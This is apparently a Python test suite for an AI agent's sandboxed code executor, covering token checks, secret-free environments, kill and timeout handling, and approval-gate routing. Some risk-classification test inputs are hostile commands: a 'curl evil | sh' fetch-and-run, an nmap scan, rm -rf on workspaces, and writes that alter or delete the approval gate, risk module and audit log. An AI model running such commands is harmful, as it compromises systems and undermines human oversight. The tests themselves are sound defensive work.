"""Tests for the sandbox executor, its client, and gate -> executor routing.

The server is exercised in REAL subprocesses over HTTP. Container-level isolation (no network,
read-only root, no secrets in the image environment) can only be proven on the Docker host:
run odysseus/mission_sandbox/verify_isolation.sh there.
"""
import asyncio
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import urllib.request
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

ODYSSEUS = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ODYSSEUS))

TOKEN = "test-token-123"
_TMP = tempfile.mkdtemp()
WORKROOT = os.path.join(_TMP, "workspace")
os.makedirs(WORKROOT, exist_ok=True)
os.environ["SANDBOX_TOKEN"] = TOKEN
os.environ["SANDBOX_WORKROOT"] = WORKROOT

_spec = importlib.util.spec_from_file_location("sandbox_server", ODYSSEUS / "mission_sandbox" / "server.py")
server = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(server)

from src import approval_gate as ag  # noqa: E402
from src.foundation import audit, mission as ms, risk, sandbox  # noqa: E402
from src.foundation.risk import RiskTier as T  # noqa: E402


def _bash_works() -> bool:
    exe = shutil.which("bash")
    if not exe:
        return False
    try:
        r = subprocess.run([exe, "-c", "echo ok"], capture_output=True, timeout=10)
        return r.stdout.strip() == b"ok"
    except Exception:
        return False


HAS_BASH = _bash_works()


class _ServerBase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = server.make_server(port=0, host="127.0.0.1")
        cls.port = cls.srv.server_address[1]
        cls.thread = threading.Thread(target=cls.srv.serve_forever, daemon=True)
        cls.thread.start()
        cls.url = f"http://127.0.0.1:{cls.port}"

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()
        cls.srv.server_close()

    def setUp(self):
        self.mission = ms.new_mission_id()
        self.ws = os.path.join(WORKROOT, self.mission)
        os.makedirs(self.ws)

    def post(self, path, body, token=TOKEN, raw=None):
        data = raw if raw is not None else json.dumps(body).encode()
        headers = {"Content-Type": "application/json"}
        if token is not None:
            headers["X-Sandbox-Token"] = token
        req = urllib.request.Request(self.url + path, data=data, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=60) as r:
                return r.status, json.loads(r.read())
        except urllib.error.HTTPError as e:
            return e.code, json.loads(e.read() or b"{}")

    def py(self, code, **kw):
        return self.post("/exec", {"mission": self.mission, "kind": "python", "code": code, **kw})[1]


class ServerTests(_ServerBase):
    def test_health_needs_no_token_but_exec_does(self):
        with urllib.request.urlopen(self.url + "/health", timeout=10) as r:
            self.assertTrue(json.loads(r.read())["ok"])
        self.assertEqual(self.post("/exec", {}, token=None)[0], 401)
        self.assertEqual(self.post("/exec", {}, token="wrong")[0], 401)
        self.assertEqual(self.post("/probe", {}, token="")[0], 401)

    def test_refuses_to_start_without_a_token(self):
        with mock.patch.dict(os.environ, {"SANDBOX_TOKEN": ""}):
            with self.assertRaises(SystemExit):
                server.make_server(port=0, host="127.0.0.1")

    def test_python_runs_in_the_mission_workspace(self):
        r = self.py("import os; print(1 + 1); print(os.getcwd())")
        self.assertEqual(r["exit_code"], 0)
        lines = r["stdout"].split()
        self.assertEqual(lines[0], "2")
        self.assertEqual(os.path.realpath(lines[1]), os.path.realpath(self.ws))

    def test_files_land_in_the_workspace(self):
        self.py("open('out.txt', 'w').write('hello')")
        self.assertEqual(Path(self.ws, "out.txt").read_text(), "hello")

    def test_environment_is_clean_no_inherited_secrets(self):
        with mock.patch.dict(os.environ, {"AWS_SECRET": "leak-me", "TELEGRAM_BOT_TOKEN": "leak-me-too"}):
            r = self.py("import os, json; print(json.dumps(dict(os.environ)))")
        env = json.loads(r["stdout"])
        self.assertNotIn("leak-me", r["stdout"])
        self.assertNotIn("SANDBOX_TOKEN", env)               # the sandbox's own token is not exposed either
        self.assertNotIn(TOKEN, r["stdout"])
        self.assertEqual(env["MISSION_WORKSPACE"], os.path.realpath(self.ws))

    def test_bad_missions_are_rejected(self):
        for mission in ("../x", "m-zzzzzz", "m-abc12", "m-abc123/../..", "", None, 5, "m-abcdef"):
            r = self.post("/exec", {"mission": mission, "kind": "python", "code": "print(1)"})[1]
            self.assertEqual(r.get("exit_code"), 2, mission)
            self.assertIn("error", r)
            self.assertNotIn("stdout", r)

    def test_kind_and_body_validation(self):
        self.assertEqual(self.post("/exec", {"mission": self.mission, "kind": "perl", "code": "1"})[1]["exit_code"], 2)
        self.assertEqual(self.post("/exec", None, raw=b"not json")[0], 400)
        self.assertEqual(self.post("/exec", None, raw=b"[1,2]")[0], 400)
        self.assertEqual(self.post("/nope", {})[0], 404)

    def test_timeout_kills_the_process(self):
        t = time.time()
        r = self.py("import time; time.sleep(60)", timeout=1)
        self.assertLess(time.time() - t, 15)
        self.assertEqual(r["exit_code"], 124)
        self.assertIn("timed out", r["error"])

    def test_output_is_capped(self):
        with mock.patch.object(server, "MAX_OUT", 100):
            r = self.py("print('x' * 5000)")
        self.assertIn("truncated", r["stdout"])
        self.assertLess(len(r["stdout"]), 200)

    def test_nonzero_exit_and_stderr_are_reported(self):
        r = self.py("import sys; sys.stderr.write('boom'); sys.exit(3)")
        self.assertEqual(r["exit_code"], 3)
        self.assertIn("boom", r["stderr"])

    def test_probe_reports_what_is_installed(self):
        r = self.post("/probe", {"bins": ["definitely-not-a-binary-xyz"], "modules": ["json", "no_such_module_xyz"]})[1]
        self.assertEqual(r["modules"], {"json": True, "no_such_module_xyz": False})
        self.assertEqual(r["bins"], {"definitely-not-a-binary-xyz": False})

    @unittest.skipUnless(HAS_BASH, "no working bash on this machine")
    def test_bash(self):
        r = self.post("/exec", {"mission": self.mission, "kind": "bash", "code": "echo hi && pwd"})[1]
        self.assertEqual(r["exit_code"], 0)
        self.assertIn("hi", r["stdout"])


class KillAndEnvTests(_ServerBase):
    def test_kill_terminates_a_running_process_promptly(self):
        result = {}

        def long_job():
            result["r"] = self.py("import time; time.sleep(120)", timeout=120)

        t0 = time.time()
        th = threading.Thread(target=long_job)
        th.start()
        killed = 0
        for _ in range(50):                                 # wait until it is registered, then kill it
            time.sleep(0.2)
            killed = self.post("/kill", {"mission": self.mission})[1]["killed"]
            if killed:
                break
        th.join(timeout=30)
        self.assertEqual(killed, 1)
        self.assertFalse(th.is_alive())
        self.assertLess(time.time() - t0, 30)
        self.assertNotEqual(result["r"]["exit_code"], 0)

    def test_kill_only_touches_that_mission_and_validates_the_id(self):
        other = ms.new_mission_id()
        os.makedirs(os.path.join(WORKROOT, other))
        out = {}
        th = threading.Thread(target=lambda: out.update(r=self.post(
            "/exec", {"mission": other, "kind": "python", "code": "import time; time.sleep(3); print('survived')",
                      "timeout": 30})[1]))
        th.start()
        time.sleep(0.8)
        self.assertEqual(self.post("/kill", {"mission": self.mission})[1]["killed"], 0)      # a different mission
        th.join(timeout=30)
        self.assertIn("survived", out["r"]["stdout"])
        self.assertEqual(self.post("/kill", {"mission": "../x"})[1]["killed"], 0)
        self.assertEqual(self.post("/kill", {"mission": 7})[1]["killed"], 0)
        self.assertEqual(self.post("/kill", {"mission": self.mission}, token="wrong")[0], 401)

    def test_only_allowlisted_non_secret_settings_reach_mission_code(self):
        env = {"LLM_BASE_URL": "http://llm-gateway:11434/v1", "LLM_MODEL": "qwen2.5:7b", "LLM_API_KEY": "leak",
               "SANDBOX_PASS_ENV": "LLM_BASE_URL,LLM_MODEL,LLM_API_KEY,NOT_SET"}
        with mock.patch.dict(os.environ, env):
            r = self.py("import os, json; print(json.dumps(dict(os.environ)))")
        seen = json.loads(r["stdout"])
        self.assertEqual(seen["LLM_BASE_URL"], "http://llm-gateway:11434/v1")
        self.assertEqual(seen["LLM_MODEL"], "qwen2.5:7b")
        self.assertNotIn("LLM_API_KEY", seen)               # names that look like secrets never pass, even if listed
        self.assertNotIn("leak", r["stdout"])

    def test_client_kill(self):
        with mock.patch.dict(os.environ, {"SANDBOX_URL": self.url, "SANDBOX_TOKEN": TOKEN}):
            self.assertEqual(sandbox.kill(self.mission), 0)
        with mock.patch.dict(os.environ, {"SANDBOX_URL": "http://127.0.0.1:9", "SANDBOX_TOKEN": TOKEN}):
            self.assertEqual(sandbox.kill(self.mission), 0)            # unreachable: best effort, no exception


class ClientTests(_ServerBase):
    def setUp(self):
        super().setUp()
        self.env = mock.patch.dict(os.environ, {"SANDBOX_URL": self.url, "SANDBOX_TOKEN": TOKEN})
        self.env.start()
        sandbox.reset_cache()

    def tearDown(self):
        self.env.stop()
        sandbox.reset_cache()

    def test_run_maps_to_the_normal_tool_result_shape(self):
        r = sandbox.run(self.mission, "python", "print('hi')")
        self.assertEqual(r, {"output": "hi", "exit_code": 0})
        r = sandbox.run(self.mission, "python", "import sys; print('a'); sys.stderr.write('b'); sys.exit(2)")
        self.assertEqual(r["exit_code"], 2)
        self.assertIn("STDERR: b", r["output"])
        self.assertEqual(sandbox.run(self.mission, "python", "pass")["output"], "(no output)")

    def test_background_marker_is_stripped(self):
        r = sandbox.run(self.mission, "bash" if HAS_BASH else "python",
                        "#!bg\necho hi" if HAS_BASH else "#!bg\nprint('hi')")
        self.assertEqual(r["output"], "hi")

    def test_server_side_errors_become_error_results(self):
        r = sandbox.run("m-abcdef", "python", "print(1)")          # workspace does not exist
        self.assertIn("sandbox:", r["error"])
        self.assertEqual(r["exit_code"], 2)

    def test_timeout_result(self):
        r = sandbox.run(self.mission, "python", "import time; time.sleep(60)", timeout=1)
        self.assertEqual(r["exit_code"], 124)
        self.assertIn("timed out", r["error"])

    def test_unsupported_tool_and_missing_token_fail_closed(self):
        with self.assertRaises(sandbox.SandboxUnavailable):
            sandbox.run(self.mission, "write_file", "x")
        with mock.patch.dict(os.environ, {"SANDBOX_TOKEN": ""}):
            with self.assertRaises(sandbox.SandboxUnavailable):
                sandbox.run(self.mission, "python", "print(1)")
            self.assertFalse(sandbox.available())

    def test_wrong_token_and_dead_server_fail_closed(self):
        # server and client share this process, so pin the SERVER's expected token
        with mock.patch.object(server, "_token", return_value=TOKEN), \
                mock.patch.dict(os.environ, {"SANDBOX_TOKEN": "wrong"}):
            with self.assertRaises(sandbox.SandboxUnavailable):
                sandbox.run(self.mission, "python", "print(1)")
        with mock.patch.dict(os.environ, {"SANDBOX_URL": "http://127.0.0.1:9"}):
            sandbox.reset_cache()
            self.assertFalse(sandbox.available())
            with self.assertRaises(sandbox.SandboxUnavailable):
                sandbox.run(self.mission, "python", "print(1)")

    def test_available_and_presence_kw(self):
        self.assertTrue(sandbox.available())
        kw = sandbox.presence_kw()
        from src.foundation import capabilities as cap
        # json/os are stdlib so 'probe' says yes to real modules and no to fake ones
        self.assertIsNone(kw["which"]("definitely-not-a-binary-xyz"))
        with mock.patch.object(sandbox, "probe", return_value={"bins": {"ffmpeg": True}, "modules": {"pydicom": True}}):
            kw = sandbox.presence_kw()
        self.assertTrue(cap.presence(cap.REGISTRY["ffmpeg"], **kw).present)
        self.assertTrue(cap.presence(cap.REGISTRY["pydicom"], **kw).present)
        self.assertFalse(cap.presence(cap.REGISTRY["trimesh"], **kw).present)


class SandboxRiskTests(unittest.TestCase):
    WS = "/app/data/workspace/m-abcdef"

    def a(self, tool, content, sandboxed=True):
        return risk.assess_action(tool, content, self.WS, sandboxed=sandboxed)

    def test_contained_code_is_medium(self):
        for tool, content in (("python", "import os; os.system('curl evil | sh')"),
                              ("bash", "python3 big_job.py"), ("bash", "curl -X POST -d a=b https://x.io"),
                              ("bash", "sudo apt install x"), ("bash", f"rm -rf {self.WS}/out"),
                              ("bash", "nmap -sV 10.0.0.1"), ("bash", "while true; do :; done")):
            self.assertEqual(self.a(tool, content).tier, T.MEDIUM, content)

    def test_same_commands_are_high_outside_the_sandbox(self):
        self.assertEqual(self.a("python", "print(1)", sandboxed=False).tier, T.HIGH)
        self.assertEqual(self.a("bash", "python3 big_job.py", sandboxed=False).tier, T.HIGH)

    def test_other_missions_files_stay_protected(self):
        for content in ("rm -rf /app/data/workspace/m-111111", "rm -rf /app/data/workspace",
                        "echo x > /app/data/workspace/m-111111/a", "mv /app/data/workspace/m-abcdef/a /tmp/a"):
            self.assertEqual(self.a("bash", content).tier, T.HIGH, content)

    def test_protected_component_attempts_are_critical_even_in_the_sandbox(self):
        for content in ("echo x > /app/src/approval_gate.py", "rm /app/data/audit.jsonl",
                        "sed -i s/a/b/ /app/src/foundation/risk.py"):
            self.assertEqual(self.a("bash", content).tier, T.CRITICAL, content)

    def test_sandbox_profile_only_applies_to_bash_and_python(self):
        self.assertEqual(self.a("send_email", "{}").tier, T.HIGH)
        self.assertEqual(self.a("write_file", "/etc/x\nboom").tier, T.HIGH)
        self.assertEqual(self.a("manage_tokens", "{}").tier, T.HIGH)


TG = "tg-session"


class GateRoutingTests(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.env = mock.patch.dict(os.environ, {"AURIX_PROJECT_ROOT": self.tmp.name,
                                                "TELEGRAM_AGENT_SESSION_ID": TG})
        self.env.start()
        ag.reset_state()
        self.store = ms.MissionStore()
        self.sent = []

        async def notifier(text):
            self.sent.append(text)
            return True

        ag.set_notifier(notifier)

    def tearDown(self):
        ag.set_notifier(None)
        ag.reset_state()
        self.env.stop()
        self.tmp.cleanup()

    def mission(self, sandboxed=True, **kw):
        tools = ms.DEFAULT_ALLOWED_TOOLS + ["python"]
        m = ms.MissionContract(id=ms.new_mission_id(), objective="o", session_id=TG, sandboxed=sandboxed,
                               allowed_tools=tools, **kw)
        self.store.propose(m)
        self.store.activate(m.id)
        return self.store.load(m.id)

    async def test_sandboxed_mission_runs_python_and_bash_without_a_ping_and_routes_them(self):
        m = self.mission()
        for tool, content in (("python", "print(1)"), ("bash", "python3 job.py"),
                              ("bash", "curl -X POST -d a=b https://x.io")):
            self.assertIsNone(await ag.enforce(tool, content, TG), content)
            self.assertEqual(ag.consume_route(), m.id, content)        # must run in the sandbox
            self.assertIsNone(ag.consume_route())                      # consumed exactly once
        self.assertEqual(self.sent, [])
        self.assertEqual(self.store.load(m.id).usage.tool_calls, 3)
        allowed = [e for e in audit.recent(20) if e["event"] == "mission_allowed"]
        self.assertTrue(all(e["sandboxed"] for e in allowed))

    async def test_a_denied_call_carries_no_route(self):
        self.mission()
        result = await ag.enforce("bash", "echo x > /app/src/approval_gate.py", TG)
        self.assertIn("Protected", result)
        self.assertIsNone(ag.consume_route())

    async def test_no_route_without_a_sandboxed_mission(self):
        self.assertIsNone(await ag.enforce("read_file", "/app/README.md", TG))
        self.assertIsNone(ag.consume_route())
        self.mission(sandboxed=False)
        task = asyncio.create_task(ag.enforce("python", "print(1)", TG))     # still pings when not sandboxed
        for _ in range(200):
            if ag.pending_ids():
                break
            await asyncio.sleep(0)
        self.assertEqual(len(ag.pending_ids()), 1)
        ag.handle_command("deny", ag.pending_ids()[0])
        await task
        self.assertIsNone(ag.consume_route())

    async def test_other_missions_files_still_ping_in_a_sandboxed_mission(self):
        self.mission()
        task = asyncio.create_task(ag.enforce("bash", "rm -rf /tmp/other", TG))
        for _ in range(200):
            if ag.pending_ids():
                break
            await asyncio.sleep(0)
        self.assertEqual(len(ag.pending_ids()), 1)
        ag.handle_command("deny", ag.pending_ids()[0])
        await task

    async def test_owner_approved_call_in_a_sandboxed_mission_still_routes_to_the_sandbox(self):
        m = self.mission(resources=ms.Resources(max_tool_calls=1))
        self.assertIsNone(await ag.enforce("python", "print(1)", TG))
        ag.consume_route()

        async def gate_then_consume():          # same task, like execute_tool_block: the route is task-local
            return await ag.enforce("python", "print(2)", TG), ag.consume_route()

        task = asyncio.create_task(gate_then_consume())                       # ceiling hit -> asks the owner
        for _ in range(200):
            if ag.pending_ids():
                break
            await asyncio.sleep(0)
        ag.handle_command("approve", ag.pending_ids()[0])
        denial, route = await task
        self.assertIsNone(denial)
        self.assertEqual(route, m.id)

    async def test_stop_engaged_leaves_no_route(self):
        self.mission()
        ag.engage_stop(60)
        self.assertIn("STOP", await ag.enforce("python", "print(1)", TG))
        self.assertIsNone(ag.consume_route())


class ExecutorIntegrationTests(_ServerBase):
    """execute_tool_block end to end: gate -> route -> real sandbox server."""

    def setUp(self):
        super().setUp()
        import tests.conftest  # noqa: F401  (stubs heavy deps exactly like pytest does)
        from src import tool_execution
        self.te = tool_execution
        self.orig_admin = tool_execution._owner_is_admin
        tool_execution._owner_is_admin = lambda owner: True
        self.tmp = tempfile.TemporaryDirectory()
        self.env = mock.patch.dict(os.environ, {
            "AURIX_PROJECT_ROOT": self.tmp.name, "TELEGRAM_AGENT_SESSION_ID": TG,
            "SANDBOX_URL": self.url, "SANDBOX_TOKEN": TOKEN, "LOCAL_ONLY_SECRET": "must-not-reach-the-sandbox"})
        self.env.start()
        ag.reset_state()
        sandbox.reset_cache()
        self.store = ms.MissionStore()
        # the mission workspace must live where the sandbox server looks for it
        self.m = ms.MissionContract(id=self.mission, objective="o", session_id=TG, sandboxed=True,
                                    allowed_tools=ms.DEFAULT_ALLOWED_TOOLS + ["python"], workspace=self.ws)
        self.store.propose(self.m)
        self.store.activate(self.m.id)

    def tearDown(self):
        self.te._owner_is_admin = self.orig_admin
        ag.reset_state()
        self.env.stop()
        self.tmp.cleanup()

    def run_tool(self, tool, content):
        return asyncio.run(self.te.execute_tool_block(SimpleNamespace(tool_type=tool, content=content),
                                                      session_id=TG, owner="rascal"))

    def test_python_runs_in_the_sandbox_not_in_the_app_process(self):
        desc, result = self.run_tool("python", "import os; print(os.getcwd()); print(os.environ.get('LOCAL_ONLY_SECRET'))")
        self.assertIn("(sandbox)", desc)
        self.assertEqual(result["exit_code"], 0)
        cwd, secret = result["output"].split()
        self.assertEqual(os.path.realpath(cwd), os.path.realpath(self.ws))
        self.assertEqual(secret, "None")                        # the app's secrets never reach it

    def test_files_written_by_the_sandbox_are_in_the_mission_workspace(self):
        self.run_tool("python", "open('result.txt', 'w').write('done')")
        self.assertEqual(Path(self.ws, "result.txt").read_text(), "done")

    def test_sandbox_down_means_nothing_runs_anywhere(self):
        marker = Path.cwd() / "LOCAL_RUN_MARKER.txt"
        marker.unlink(missing_ok=True)
        with mock.patch.dict(os.environ, {"SANDBOX_URL": "http://127.0.0.1:9"}):
            desc, result = self.run_tool("python", f"open(r'{marker}', 'w').write('ran locally!')")
        self.assertIn("sandbox unavailable - nothing was run", result["error"])
        self.assertFalse(marker.exists(), "FAIL CLOSED violated: code ran in the local container")

    def test_protected_write_is_denied_before_reaching_the_sandbox(self):
        desc, result = self.run_tool("bash", "echo x > /app/src/approval_gate.py")
        self.assertTrue(desc.endswith("DENIED"))
        self.assertIn("Protected", result["error"])

    def test_stopped_mission_no_longer_runs_anything(self):
        self.store.stop_active()
        marker = Path(self.ws) / "should_not_exist.txt"
        with mock.patch.object(ag, "_notifier", side_effect=RuntimeError("no owner in this test")):
            desc, result = self.run_tool("python", f"open(r'{marker}', 'w').write('x')")
        self.assertFalse(marker.exists())
        self.assertIn("error", result)


if __name__ == "__main__":
    unittest.main()
